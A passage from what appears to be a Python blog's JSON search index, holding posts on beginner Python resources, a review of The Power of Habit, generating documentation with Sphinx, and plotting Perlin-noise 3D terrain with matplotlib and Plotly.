{\"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\"}}, \"title\": {\"x\": 0.05}, \"xaxis\": {\"automargin\": true, \"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\", \"title\": {\"standoff\": 15}, \"zerolinecolor\": \"white\", \"zerolinewidth\": 2}, \"yaxis\": {\"automargin\": true, \"gridcolor\": \"white\", \"linecolor\": \"white\", \"ticks\": \"\", \"title\": {\"standoff\": 15}, \"zerolinecolor\": \"white\", \"zerolinewidth\": 2}}}, \"title\": {\"text\": \"Gradient Descent Steps\"}}, {\"responsive\": true} ) }; In [ ]:","tags":"Python","url":"https://jackmckew.dev/3d-gradient-descent-in-python.html","loc":"https://jackmckew.dev/3d-gradient-descent-in-python.html"},{"title":"Getting Started in Python","text":"Resources & tips for getting started in Python Glossary One of the most useful skills in my opinion in all walks of life is the ability to find information & answers. A very useful tool for doing this is the internet & search engines like Google. In my opinion being able to search the internet for answers to your programming questions is a skill in itself, knowing the right words or phrases to use is a massive part of that, so I will begin with a glossary of terminology for things that may make it easier to answer your questions. Term Meaning Directory In Windows, a directory is commonly referred to as a folder. Module A module in software is a piece of software responsible for one specific functionality. In Python, they are separate files with a .py extension containing functions, classes and/or variables. Package A package in Python is a directory of packages and/or modules. It is more or less a directory with one special __init__.py file inside it. Runtime / Environment The runtime or environment in Python is the context in which the code runs. Variable A variable is a location that stores data temporarily within a program which can be modified, stored and/or displayed. Object An object is a combination of data, whether in variables or structures. Class A class refers to a set of related objects with common properties. Function A named section of a program that has a specific purpose. Algorithms A set of guidelines which describe how to perform a task. API Application Programming Interface, is a structure in which you can interact with another piece of software. Bug A bug is an unexpected error which causes a malfunction. Frontend The front-end is how the user interacts with the software, like Windows. Backend The back-end is all the tasks that happen in the background with the user's interaction Argument An argument is a value or variable passed into a function. Boolean Boolean is an expression used with True or False statements, operators include AND, OR, NOT. Command Line Interface The user interface based on text, typically used on Windows through cmd.exe (Command Prompt) Shell A shell is a program that takes in commands (like Command Prompt) to interact with the operating system. Compilation Compilation is converting programming (code) into instructions the computer can understand. List An ordered sequence of elements, denoted with square brackets [ ] Dictionary An ordered (in 3.6+) collection of data, with a key and a value, denoted with curly brackets Exception If a situation comes up that the program cannot handle, it'll throw an exception. Loop A loop allows code to be executed repeated, either with a for (finite amount of times) or while (indefinite). Iteration Repetition of a process, you iterate over a loop numerous times. https://github.com/ A website/service where lots of open source packages live and great resource for finding examples of real-use code. Editor There is so many editors out there it is difficult to find the right one for you. Mu https://codewith.mu/ Mu is a simple Python editor, designed for beginners. VS Code https://code.visualstudio.com/ While not specifically for Python, it has an amazing Python extension and is my go-to editor. Sublime Text https://www.sublimetext.com/ A self proclaimed \"A sophisticated text editor for code, markup and prose\". PyCharm https://www.jetbrains.com/pycharm/ A more fleshed out full suite for professional developers. All the bells and whistles included. Resources There is an abundance of resources on the internet for getting started with Python (including this one!), these are my personal recommendations. Automate The Boring Stuff http://automatetheboringstuff.com/ Computers are made to do the boring things for us, so make the most of it! This book goes through many practical examples of how you can use Python to automate the boring stuff out of your life. Code Academy https://www.codecademy.com/catalog/language/python While the Python 3 course on Code Academy isn't free, the Python 2.7 version is and you can always learn the differences later on. Python Bytes Podcast https://pythonbytes.fm/ Weekly half an hour podcast on exciting packages & tools in the Python space. Great to listen to on your commute! Github https://github.com/ Github is a website/service where lots of open source projects & packages live. Lots of information can be found here on the projects themselves and in the issues raised/answered previously. Cheat Sheet If you're anything like me, you'd appreciate a nicely laid out cheat sheet. https://perso.limsi.fr/pointal/_media/python:cours:mementopython3-english.pdf Real Python https://realpython.com/ Real Python is an amazing website, with lots of beginner friendly tutorials on more topics than I can imagine. Packages The best part about Python is the community and abundance of free, open source packages that you can utilise to not re-invent the wheel when solving problems. I did a blog post on useful packages in 2019, check it out at: https://jackmckew.dev/episode-10-python-package-cheat-sheet.html If there is anything I have missed, please feel free to drop a comment below and I will update this post!","tags":"Python","url":"https://jackmckew.dev/getting-started-in-python.html","loc":"https://jackmckew.dev/getting-started-in-python.html"},{"title":"Book Review: The Power Of Habits","text":"Power of Habits by Charles Duhigg was one of the most useful books I have read. While it doesn't explicitly step the reader through how to change habits, it thoroughly goes through many examples of where habits have changed other people's lives, case studies if you will. By then being able to recognise the habitual changes these people had to make, this allows the reader to (maybe) identify and be able to change some of their own habits to better their own life. Cue, Routine, Reward A concept that is repeatedly drawn parallel to habitual behaviours in the case study examples is that of Cue, Routine, Reward. Cue: Something that 'triggers' a habitual behaviour, this could be hunger, boredom or even just a bright colour. Routine: The process that follows the cue. Reward: The end goal of this habit to satisfy a need/desire for something An example of this in my own life is that when I'm at work sitting at my desk tapping away at my jobs for the day, I'll finish one of my tasks for the day (I love bullet journalling to maintain these), I won't want to start the next task straight away so I'll typically go to the kitchen and fill up my drink bottle. Here the process is as follows: Cue: Finish a task at work Routine: Walk to the kitchen and fill up water bottle Reward: A moment to stretch my legs and get a drink While this is a good habit that I have tried to instill myself, can also be replaced by any bad habit (eg, walk to the kitchen and eat a bag of chips) Case Study - Alcoa A fantastic case study that was presented in the book that resonated with me was the changing of the CEO at Alcoa. Alcoa is one of the biggest manufacturers of aluminium in the United States. When the CEO had changed, Alcoa was a dangerous place to work with a high staff injury rate, turns out working with molten metal all day can be a dangerous activity, who would've knew. The new CEO made it his goal that the number 1 priority of Alcoa going forward would be safety. Profits, revenue, etc were not going to be the focus of Alcoa anymore (upsetting lots of investors at the time). By implementing changes such as employees would be required to implement a new safety procedure to get a promotion and that no task was worth doing in an unsafe manner, the CEO had instilled a habit of safety into the culture of the company. The ripple on effect of this was that by putting a focus on one aspect of the entire operation, this amended many of the things that were halting progress within the company. For example, instead of machinery breaking down catastrophically and needing long repair times, equipment was being regularly maintained as to keep it in safe working order and producing more material. Workers that were needing to take lots of time off were now able to keep working now that they were not falling ill to injury's or sickness from the workplace. This lead to Alcoa producing some of its best results in history and is a great example how focusing on one element of a business can have such a ripple effect. Michael Phelps Early on in Michael Phelps life, a coach realized Michael's potential as an athlete in swimming. This coach through instilling habits into Michael's routine, would go on to produce one of the most athletic swimmers of all time. By getting Michael to follow the exact same process (routine) every time before a race, this made it naturally for Michael to compete so strongly. Michael watched a video of the perfect race, every single time before a race, listened to the same pump up music through his headphones, stood up and waved to the crowd the exact same way every time such that it had became a habit to swim. Something that he didn't actively have to think about to do. Conclusion I personally absolutely loved this book and it's appreciation for that not every person works the same way. By presenting the reader with a multitude of case studies and allowing the reader to determine what might be effective in their life for themselves, this doesn't instruct the reader to learn how their habits work but rather allows them to see the world through a different lens. You can find this book at: https://www.amazon.com.au/Power-Habit-What-Life-Business/dp/081298160X","tags":"Book Reviews","url":"https://jackmckew.dev/book-review-the-power-of-habits.html","loc":"https://jackmckew.dev/book-review-the-power-of-habits.html"},{"title":"Automatically Generate Documentation with Sphinx","text":"Document code automatically through docstrings with Sphinx This post goes into how to generate documentation for your python projects automatically with Sphinx! First off we have to install sphinx into our virtual environment. Pending on your flavour, we can do any of the following 1 2 3 pip install sphinx conda install sphinx pipenv install sphinx Once you have installed sphinx, inside the project (let's use the directory of this blog post), we can create a docs folder in which all our documentation will live. 1 2 mkdir docs cd docs Ensuring to have our virtual environment with sphinx installed active, we run sphinx-quickstart , this tool allows us to populate some information for our documentation in a nice Q&A style. 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 Welcome to the Sphinx 2 .3.1 quickstart utility. Please enter values for the following settings ( just press Enter to accept a default value, if one is given in brackets ) . Selected root path: . You have two options for placing the build directory for Sphinx output. Either, you use a directory \"_build\" within the root path, or you separate \"source\" and \"build\" directories within the root path. > Separate source and build directories ( y/n ) [ n ] : y The project name will occur in several places in the built documentation. > Project name: SphinxDemo > Author name ( s ) : Jack McKew > Project release [] : If the documents are to be written in a language other than English, you can select a language here by its language code. Sphinx will then translate text that it generates into that language. For a list of supported codes, see https://www.sphinx-doc.org/en/master/usage/configuration.html#confval-language. > Project language [ en ] : Creating file . \\s ource \\c onf.py. Creating file . \\s ource \\i ndex.rst. Creating file . \\M akefile. Creating file . \\m ake.bat. Finished: An initial directory structure has been created. You should now populate your master file . \\s ource \\i ndex.rst and create other documentation source files. Use the Makefile to build the docs, like so: make builder where \"builder\" is one of the supported builders, e.g. html, latex or linkcheck. Now let's create an example package that we can write some documentation in. 1 2 mkdir sphinxdemo cd sphinxdemo Then we create 3 files inside our example package: 1 __init__.py download 1 version = \"0.1.1\" 1 __main__.py download 1 2 3 4 5 6 from .file_functions import get_files_in_folder if __name__ == \"__main__\" : py_files = get_files_in_folder ( \".\" , extension = \".py\" ) print ( py_files ) 1 file_functions.py download 1 2 3 4 5 6 7 8 9 10 11 12 13 import os def get_files_in_folder ( path , extension ): f = [] for ( dirpath , dirnames , filenames ) in os . walk ( path ): if extension : for filename in filenames : if filename . endswith ( extension ): f . append ( filename ) else : f . extend ( filenames ) return f If you are using VS Code to use packages with debugging, change your launch.json with the following: \"configurations\": [ { \"name\": \"Python: Module - sphinxdemo\", \"type\": \"python\", \"request\": \"launch\", \"module\": \"sphinxdemo. __main__ \" } To add documentation within our source code, we use docstrings. There are many available styles of docstrings out there, my personal preference is Google Docstring Style . We need to enable the napoleon sphinx extensions in docs/conf.py for this style to work. The resulting documented code will look like: 1 __init__.py download 1 2 3 4 5 6 \"\"\" Initialisation file for package sphinxdemo-with-docs Declare any package wide variables here \"\"\" version = \"0.1.1\" 1 __main__.py download 1 2 3 4 5 6 7 8 9 10 11 12 \"\"\" Main runtime for sphinxdemo-with-docs package __main__.py file used within package to work with `python -m` functionality. Prints out list of all *.py files within current directory when run \"\"\" from .file_functions import get_files_in_folder if __name__ == \"__main__\" : py_files = get_files_in_folder ( \".\" , extension = \".py\" ) print ( py_files ) 1 file_functions.py download 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 \"\"\" Functions for parsing folders for files. \"\"\" import os def get_files_in_folder ( path , extension ): \"\"\" Prints all files in folder, if an extension is given, will only print the files with the given extension Args: path (string): folder to recursively search through for specific extensions extension (string): extension of file type to filter by Returns: list: list of all filenames within path with matching extension \"\"\" f = [] for ( dirpath , dirnames , filenames ) in os . walk ( path ): if extension : for filename in filenames : if filename . endswith ( extension ): f . append ( filename ) else : f . extend ( filenames ) return f Now at a minimum our source code is documented, now to present these docstrings in a format that we can share with others (html). First we need to set the sphinx configuration, the file which contains this (we generated with sphinx-quickstart) is located in docs/source/conf.py . We are going to utilise the following sphinx extensions (they are all in-built into sphinx): sphinx.ext.autodoc sphinx.ext.napoleon sphinx.ext.viewcode sphinx.ext.autosummary Our conf.py file for sphinx's configuration results in: Sphinx Configuration File conf.py download 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 # Configuration file for the Sphinx documentation builder. # # This file only contains a selection of the most common options. For a full # list see the documentation: # https://www.sphinx-doc.org/en/master/usage/configuration.html # -- Path setup -------------------------------------------------------------- # If extensions (or modules to document with autodoc) are in another directory, # add these directories to sys.path here. If the directory is relative to the # documentation root, use os.path.abspath to make it absolute, like shown here. # import os import sys sys . path . insert ( 0 , os . path . abspath ( \"../..\" )) # -- Project information ----------------------------------------------------- project = \"SphinxDemo\" copyright = \"2020, Jack McKew\" author = \"Jack McKew\" # -- General configuration --------------------------------------------------- # Add any Sphinx extension module names here, as strings. They can be # extensions coming with Sphinx (named 'sphinx.ext.*') or your custom # ones. extensions = [ \"sphinx.ext.autodoc\" , \"sphinx.ext.napoleon\" , \"sphinx.ext.viewcode\" , \"sphinx.ext.autosummary\" , ] # Add any paths that contain templates here, relative to this directory. templates_path = [ \"_templates\" ] autosummary_generate = True # List of patterns, relative to source directory, that match files and # directories to ignore when looking for source files. # This pattern also affects html_static_path and html_extra_path. exclude_patterns = [] # -- Options for HTML output ------------------------------------------------- # The theme to use for HTML and HTML Help pages. See the documentation for # a list of builtin themes. # html_theme = \"alabaster\" # Add any paths that contain custom static files (such as style sheets) here, # relative to this directory. They are copied after the builtin static files, # so a file named \"default.css\" will overwrite the builtin \"default.css\". html_static_path = [ \"_static\" ] We must also set our index.rst (restructured text) with what we want to see in our documentation. Documentation Index File index.rst download 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 .. SphinxDemo documentation master file , created by sphinx - quickstart on Tue Feb 4 20 : 05 : 16 2020. You can adapt this file completely to your liking , but it should at least contain the root `toctree` directive . Welcome to SphinxDemo 's documentation! ====================================== .. toctree:: :maxdepth: 4 :caption: Contents: .. rubric:: Modules .. autosummary:: :toctree: generated sphinxdemo_with_docs.__init__ sphinxdemo_with_docs.__main__ sphinxdemo_with_docs.file_functions Indices and tables ================== * :ref:`genindex` * :ref:`modindex` * :ref:`search` To generate individual pages for our modules, classes and functions, we define separate templates, these are detailed here: autosummary templates Next we navigate our docs directory, and finally run: 1 make html This will generate all the stubs for our documentation and compile them into HTML format.","tags":"Python","url":"https://jackmckew.dev/automatically-generate-documentation-with-sphinx.html","loc":"https://jackmckew.dev/automatically-generate-documentation-with-sphinx.html"},{"title":"3D Terrain in Python","text":"Generating & Visualising 3D Terrains in Python Today, let's put together a 3D visualisation of randomly generated 'terrain' with Python. Data visualisation is an absolutely key skill in any developers pocket, as communicating both data, analysis and more is thoroughly simplified through the use of graphs. While a picture tells a thousand words, this also means that it'll bring a thousand intepretations. This is what we are going to try and reproduce: First off, before generating 3D terrain, it would be nice to generate 2D terrain. To achieve this, we are going to make use of Perlin Noise . Perlin noise, created by Ken Perlin in 1983, for the movie Tron, was originally developed to make more natural looking textures on surfaces. The wikipedia site has a great graphical breakdown of how the algorithm works behind the scenes. For Perlin noise in Python, rather than implementing it ourselves, there is a package (with a quite apt name) named noise . The noise package contains multiple algorithms inside it for generating different types of noise. For visualising our terrain in the first instance, we shall use matplotlib . As always, we import the necessary libraries for our project at the beginning. Make note of mpl_toolkits.mplot3d , this comes along with matplotlib and is required for plotting in 3 dimensions. If you are working in a jupyter notebook, when you plot in 3D with matplotlib, the resulting graph will not be interactive unless the magic command %matplotlib qt is used and pyqt5 is installed in your environment. This will create a new window for your plot where you can interact with it. In [1]: % matplotlib inline import noise import numpy as np import matplotlib from mpl_toolkits.mplot3d import axes3d Now that we have imported all of our necessary libraries to begin with. Let's find out how to interact with the noise package through use of the help() function. As we can see below, there are a number of settings used when passed into any of the pnoisex functions (replace x with amount of dimensions, eg, 2 for 2 dimensions). In [2]: help ( noise . pnoise2 ) help ( noise . pnoise3 ) Help on built-in function noise2 in module noise._perlin: noise2(...) noise2(x, y, octaves=1, persistence=0.5, lacunarity=2.0, repeatx=1024, repeaty=1024, base=0.0) 2 dimensional perlin improved noise function (see noise3 for more info) Help on built-in function noise3 in module noise._perlin: noise3(...) noise3(x, y, z, octaves=1, persistence=0.5, lacunarity=2.0repeatx=1024, repeaty=1024, repeatz=1024, base=0.0) return perlin \"improved\" noise value for specified coordinate octaves -- specifies the number of passes for generating fBm noise, defaults to 1 (simple noise). persistence -- specifies the amplitude of each successive octave relative to the one below it. Defaults to 0.5 (each higher octave's amplitude is halved). Note the amplitude of the first pass is always 1.0. lacunarity -- specifies the frequency of each successive octave relative to the one below it, similar to persistence. Defaults to 2.0. repeatx, repeaty, repeatz -- specifies the interval along each axis when the noise values repeat. This can be used as the tile size for creating tileable textures base -- specifies a fixed offset for the input coordinates. Useful for generating different noise textures with the same repeat interval In [3]: shape = ( 50 , 50 ) scale = 100.0 octaves = 6 persistence = 0.5 lacunarity = 2.0 Now to generate our 2D terrain! We initialise a numpy array , that will contain the values of our world. As we initalise the array with all zero values, now it is time to iterate through the empty array and fill it with Perlin Noise! In [4]: world = np . zeros ( shape ) for i in range ( shape [ 0 ]): for j in range ( shape [ 1 ]): world [ i ][ j ] = noise . pnoise2 ( i / scale , j / scale , octaves = octaves , persistence = persistence , lacunarity = lacunarity , repeatx = 1024 , repeaty = 1024 , base = 42 ) We have now initialised our 2 dimensional array with all the values inside for our terrain, let's plot it now! Since we are mimicking topography, let's use the 'terrain' colormap. All the available colormaps in matplotlib are listed here: https://matplotlib.org/examples/color/colormaps_reference.html In [5]: matplotlib . pyplot . imshow ( world , cmap = 'terrain' ) Out[5]: <matplotlib.image.AxesImage at 0x24bd59119c8> *{stroke-linecap:butt;stroke-linejoin:round;} Beautiful! We can now see our 'lake' off to the side and our 'mountains' over on the right. For plotting this in 3 dimensions, we must initialise 2 more arrays which will contain the x-y co-ordinates of our world. In [6]: lin_x = np . linspace ( 0 , 1 , shape [ 0 ], endpoint = False ) lin_y = np . linspace ( 0 , 1 , shape [ 1 ], endpoint = False ) x , y = np . meshgrid ( lin_x , lin_y ) Now it's time to plot in 3D with matplotlib, there is a note above if you are using jupyter regarding interactivity. In [7]: fig = matplotlib . pyplot . figure () ax = fig . add_subplot ( 111 , projection = \"3d\" ) ax . plot_surface ( x , y , world , cmap = 'terrain' ) Out[7]: <mpl_toolkits.mplot3d.art3d.Poly3DCollection at 0x24be0b2af08> *{stroke-linecap:butt;stroke-linejoin:round;} Now let's use Plotly , to make an interactive plot so everybody can fly around in our terrain. To make sure that we can keep the same colour map, Plotly , has nicely documented a conversion from matplotlib colour maps to Plotly compatible ones. This is listed here: In [8]: terrain_cmap = matplotlib . cm . get_cmap ( 'terrain' ) def matplotlib_to_plotly ( cmap , pl_entries ): h = 1.0 / ( pl_entries - 1 ) pl_colorscale = [] for k in range ( pl_entries ): C = list ( map ( np . uint8 , np . array ( cmap ( k * h )[: 3 ]) * 255 )) pl_colorscale . append ([ k * h , 'rgb' + str (( C [ 0 ], C [ 1 ], C [ 2 ]))]) return pl_colorscale terrain = matplotlib_to_plotly ( terrain_cmap , 255 ) Finally time to produce the interactive graph! Luckily for us, Plotly has created an API to the JavaScript library so this can be produce solely in Python. In [9]: import plotly import plotly.graph_objects as go plotly . offline . init_notebook_mode ( connected = True ) fig = go . Figure ( data = [ go . Surface ( colorscale = terrain , z = world )]) fig . update_layout ( title = 'Random 3D Terrain' ) # Note that include_plotlyjs is used as cdn so that the static site generator can read it and present it on the browser. This is not typically required. html = plotly . offline . plot ( fig , filename = '3d-terrain-plotly.html' , include_plotlyjs = 'cdn' ) window.PlotlyConfig = {MathJaxConfig: 'local'}; if (window.MathJax) {MathJax.Hub.Config({SVG: {font: \"STIX-Web\"}});} if (typeof require !== 'undefined') { require.undef(\"plotly\"); requirejs.config({ paths: { 'plotly': ['https://cdn.plot.ly/plotly-latest.min'] } }); require(['plotly'], function(Plotly) { window._Plotly = Plotly; }); } In [10]: # This is for showing within a jupyter notebook on the browser. from IPython.core.display import HTML HTML ( html ) Out[10]: window.PlotlyConfig = {MathJaxConfig: 'local'}; window.PLOTLYENV=window.PLOTLYENV || {}; if (document.getElementById(\"b29f8558-a065-400d-95ce-3981f14d1a87\")) { Plotly.newPlot( 'b29f8558-a065-400d-95ce-3981f14d1a87', [{\"colorscale\": [[0.0, \"rgb(51, 51, 153)\"], [0.003937007874015748, \"rgb(49, 53, 155)\"], [0.007874015748031496, \"rgb(48, 56, 158)\"], [0.011811023622047244, \"rgb(47, 59, 161)\"], [0.015748031496062992, \"rgb(45, 61, 163)\"], [0.01968503937007874, \"rgb(44, 64, 166)\"], [0.023622047244094488, \"rgb(43, 67, 169)\"], [0.027559055118110236, \"rgb(41, 69, 171)\"], [0.031496062992125984, \"rgb(40, 72, 174)\"], [0.03543307086614173, \"rgb(39, 75, 177)\"], [0.03937007874015748, \"rgb(37, 77, 179)\"], [0.04330708661417323, \"rgb(36, 80, 182)\"], [0.047244094488188976, \"rgb(35, 83, 185)\"], [0.051181102362204724, \"rgb(33, 85, 187)\"], [0.05511811023622047, \"rgb(32, 88, 190)\"], [0.05905511811023622, \"rgb(31, 91, 193)\"], [0.06299212598425197, \"rgb(29, 93, 195)\"], [0.06692913385826771, \"rgb(28, 96, 198)\"], [0.07086614173228346, \"rgb(27, 98, 201)\"], [0.07480314960629922, \"rgb(25, 101, 203)\"], [0.07874015748031496, \"rgb(24, 104, 206)\"], [0.0826771653543307, \"rgb(23, 107, 209)\"], [0.08661417322834646, \"rgb(21, 109, 211)\"], [0.09055118110236221, \"rgb(20, 112, 214)\"], [0.09448818897637795, \"rgb(19, 115, 217)\"], [0.09842519685039369, \"rgb(17, 117, 219)\"], [0.10236220472440945, \"rgb(16, 120, 222)\"], [0.1062992125984252, \"rgb(14, 123, 225)\"], [0.11023622047244094, \"rgb(13, 125, 227)\"], [0.11417322834645668, \"rgb(12, 128, 230)\"], [0.11811023622047244, \"rgb(11, 131, 233)\"], [0.1220472440944882, \"rgb(9, 133, 235)\"], [0.12598425196850394, \"rgb(8, 136, 238)\"], [0.12992125984251968, \"rgb(7, 138, 241)\"], [0.13385826771653542, \"rgb(5, 141, 243)\"], [0.1377952755905512, \"rgb(4, 144, 246)\"], [0.14173228346456693, \"rgb(3, 147, 249)\"], [0.14566929133858267, \"rgb(1, 149, 251)\"], [0.14960629921259844, \"rgb(0, 152, 254)\"], [0.15354330708661418, \"rgb(0, 154, 250)\"], [0.15748031496062992, \"rgb(0, 156, 244)\"], [0.16141732283464566, \"rgb(0, 158, 238)\"], [0.1653543307086614, \"rgb(0, 160, 232)\"], [0.16929133858267717, \"rgb(0, 162, 226)\"], [0.1732283464566929, \"rgb(0, 164, 220)\"], [0.17716535433070865, \"rgb(0, 166, 214)\"], [0.18110236220472442, \"rgb(0, 168, 208)\"], [0.18503937007874016, \"rgb(0, 170, 202)\"], [0.1889763779527559, \"rgb(0, 172, 196)\"], [0.19291338582677164, \"rgb(0, 174, 190)\"], [0.19685039370078738, \"rgb(0, 176, 184)\"], [0.20078740157480315, \"rgb(0, 178, 178)\"], [0.2047244094488189, \"rgb(0, 180, 172)\"], [0.20866141732283464, \"rgb(0, 182, 166)\"], [0.2125984251968504, \"rgb(0, 184, 160)\"], [0.21653543307086615, \"rgb(0, 186, 154)\"], [0.2204724409448819, \"rgb(0, 188, 148)\"], [0.22440944881889763, \"rgb(0, 190, 142)\"], [0.22834645669291337, \"rgb(0, 192, 136)\"], [0.23228346456692914, \"rgb(0, 194, 130)\"], [0.23622047244094488, \"rgb(0, 196, 124)\"], [0.24015748031496062, \"rgb(0, 198, 118)\"], [0.2440944881889764, \"rgb(0, 200, 112)\"], [0.24803149606299213, \"rgb(0, 202, 106)\"], [0.25196850393700787, \"rgb(1, 204, 102)\"], [0.2559055118110236, \"rgb(5, 205, 103)\"], [0.25984251968503935, \"rgb(8, 205, 103)\"], [0.2637795275590551, \"rgb(13, 206, 104)\"], [0.26771653543307083, \"rgb(17, 207, 105)\"], [0.27165354330708663, \"rgb(21, 208, 106)\"], [0.2755905511811024, \"rgb(25, 209, 107)\"], [0.2795275590551181, \"rgb(29, 209, 107)\"], [0.28346456692913385, \"rgb(33, 210, 108)\"], [0.2874015748031496, \"rgb(37, 211, 109)\"], [0.29133858267716534, \"rgb(40, 212, 110)\"], [0.2952755905511811, \"rgb(45, 213, 111)\"], [0.2992125984251969, \"rgb(49, 213, 111)\"], [0.3031496062992126, \"rgb(53, 214, 112)\"], [0.30708661417322836, \"rgb(57, 215, 113)\"], [0.3110236220472441, \"rgb(61, 216, 114)\"], [0.31496062992125984, \"rgb(65, 217, 115)\"], [0.3188976377952756, \"rgb(69, 217, 115)\"], [0.3228346456692913, \"rgb(72, 218, 116)\"], [0.32677165354330706, \"rgb(77, 219, 117)\"], [0.3307086614173228, \"rgb(81, 220, 118)\"], [0.3346456692913386, \"rgb(85, 221, 119)\"], [0.33858267716535434, \"rgb(89, 221, 119)\"], [0.3425196850393701, \"rgb(93, 222, 120)\"], [0.3464566929133858, \"rgb(97, 223, 121)\"], [0.35039370078740156, \"rgb(101, 224, 122)\"], [0.3543307086614173, \"rgb(104, 225, 122)\"], [0.35826771653543305, \"rgb(109, 225, 123)\"], [0.36220472440944884, \"rgb(113, 226, 124)\"], [0.3661417322834646, \"rgb(117, 227, 125)\"], [0.3700787401574803, \"rgb(121, 228, 126)\"], [0.37401574803149606, \"rgb(125, 229, 127)\"], [0.3779527559055118, \"rgb(129, 229, 127)\"], [0.38188976377952755, \"rgb(133, 230, 128)\"], [0.3858267716535433, \"rgb(136, 231, 129)\"], [0.38976377952755903, \"rgb(141, 232, 130)\"], [0.39370078740157477, \"rgb(145, 233, 131)\"], [0.39763779527559057, \"rgb(149, 233, 131)\"], [0.4015748031496063, \"rgb(153, 234, 132)\"], [0.40551181102362205, \"rgb(157, 235, 133)\"], [0.4094488188976378, \"rgb(161, 236, 134)\"], [0.41338582677165353, \"rgb(165, 237, 135)\"], [0.41732283464566927, \"rgb(168, 237, 135)\"], [0.421259842519685, \"rgb(173, 238, 136)\"], [0.4251968503937008, \"rgb(177, 239, 137)\"], [0.42913385826771655, \"rgb(181, 240, 138)\"], [0.4330708661417323, \"rgb(185, 241, 139)\"], [0.43700787401574803, \"rgb(189, 241, 139)\"], [0.4409448818897638, \"rgb(193, 242, 140)\"], [0.4448818897637795, \"rgb(197, 243, 141)\"], [0.44881889763779526, \"rgb(200, 244, 142)\"], [0.452755905511811, \"rgb(205, 245, 143)\"], [0.45669291338582674, \"rgb(209, 245, 143)\"], [0.46062992125984253, \"rgb(213, 246, 144)\"], [0.4645669291338583, \"rgb(217, 247, 145)\"], [0.468503937007874, \"rgb(221, 248, 146)\"], [0.47244094488188976, \"rgb(225, 249, 147)\"], [0.4763779527559055, \"rgb(229, 249, 147)\"], [0.48031496062992124, \"rgb(232, 250, 148)\"], [0.484251968503937, \"rgb(237, 251, 149)\"], [0.4881889763779528, \"rgb(241, 252, 150)\"], [0.4921259842519685, \"rgb(245, 253, 151)\"], [0.49606299212598426, \"rgb(249, 253, 151)\"], [0.5, \"rgb(254, 253, 152)\"], [0.5039370078740157, \"rgb(252, 251, 151)\"], [0.5078740157480315, \"rgb(250, 248, 150)\"], [0.5118110236220472, \"rgb(248, 246, 149)\"], [0.515748031496063, \"rgb(246, 243, 148)\"], [0.5196850393700787, \"rgb(244, 240, 147)\"], [0.5236220472440944, \"rgb(242, 238, 145)\"], [0.5275590551181102, \"rgb(240, 235, 144)\"], [0.5314960629921259, \"rgb(238, 233, 143)\"], [0.5354330708661417, \"rgb(236, 230, 142)\"], [0.5393700787401575, \"rgb(234, 228, 141)\"], [0.5433070866141733, \"rgb(232, 225, 140)\"], [0.547244094488189, \"rgb(230, 223, 139)\"], [0.5511811023622047, \"rgb(228, 220, 138)\"], [0.5551181102362205, \"rgb(226, 217, 137)\"], [0.5590551181102362, \"rgb(224, 215, 136)\"], [0.562992125984252, \"rgb(222, 212, 135)\"], [0.5669291338582677, \"rgb(220, 210, 134)\"], [0.5708661417322834, \"rgb(218, 207, 133)\"], [0.5748031496062992, \"rgb(216, 205, 131)\"], [0.5787401574803149, \"rgb(214, 202, 130)\"], [0.5826771653543307, \"rgb(211, 199, 129)\"], [0.5866141732283464, \"rgb(210, 197, 128)\"], [0.5905511811023622, \"rgb(208, 194, 127)\"], [0.5944881889763779, \"rgb(206, 192, 126)\"], [0.5984251968503937, \"rgb(204, 189, 125)\"], [0.6023622047244095, \"rgb(202, 187, 124)\"], [0.6062992125984252, \"rgb(200, 184, 123)\"], [0.610236220472441, \"rgb(198, 182, 122)\"], [0.6141732283464567, \"rgb(195, 179, 121)\"], [0.6181102362204725, \"rgb(194, 176, 120)\"], [0.6220472440944882, \"rgb(192, 174, 118)\"], [0.6259842519685039, \"rgb(190, 171, 117)\"], [0.6299212598425197, \"rgb(188, 169, 116)\"], [0.6338582677165354, \"rgb(186, 166, 115)\"], [0.6377952755905512, \"rgb(184, 164, 114)\"], [0.6417322834645669, \"rgb(182, 161, 113)\"], [0.6456692913385826, \"rgb(179, 159, 112)\"], [0.6496062992125984, \"rgb(178, 156, 111)\"], [0.6535433070866141, \"rgb(176, 153, 110)\"], [0.6574803149606299, \"rgb(174, 151, 109)\"], [0.6614173228346456, \"rgb(172, 148, 108)\"], [0.6653543307086615, \"rgb(170, 146, 107)\"], [0.6692913385826772, \"rgb(168, 143, 106)\"], [0.6732283464566929, \"rgb(166, 141, 104)\"], [0.6771653543307087, \"rgb(163, 138, 103)\"], [0.6811023622047244, \"rgb(162, 135, 102)\"], [0.6850393700787402, \"rgb(160, 133, 101)\"], [0.6889763779527559, \"rgb(158, 130, 100)\"], [0.6929133858267716, \"rgb(156, 128, 99)\"], [0.6968503937007874, \"rgb(154, 125, 98)\"], [0.7007874015748031, \"rgb(152, 123, 97)\"], [0.7047244094488189, \"rgb(150, 120, 96)\"], [0.7086614173228346, \"rgb(147, 118, 95)\"], [0.7125984251968503, \"rgb(146, 115, 94)\"], [0.7165354330708661, \"rgb(144, 112, 93)\"], [0.7204724409448818, \"rgb(142, 110, 91)\"], [0.7244094488188977, \"rgb(140, 107, 90)\"], [0.7283464566929134, \"rgb(138, 105, 89)\"], [0.7322834645669292, \"rgb(136, 102, 88)\"], [0.7362204724409449, \"rgb(134, 100, 87)\"], [0.7401574803149606, \"rgb(131, 97, 86)\"], [0.7440944881889764, \"rgb(130, 95, 85)\"], [0.7480314960629921, \"rgb(128, 92, 84)\"], [0.7519685039370079, \"rgb(129, 93, 86)\"], [0.7559055118110236, \"rgb(131, 96, 88)\"], [0.7598425196850394, \"rgb(133, 98, 91)\"], [0.7637795275590551, \"rgb(135, 101, 94)\"], [0.7677165354330708, \"rgb(136, 103, 96)\"], [0.7716535433070866, \"rgb(139, 106, 99)\"], [0.7755905511811023, \"rgb(141, 109, 102)\"], [0.7795275590551181, 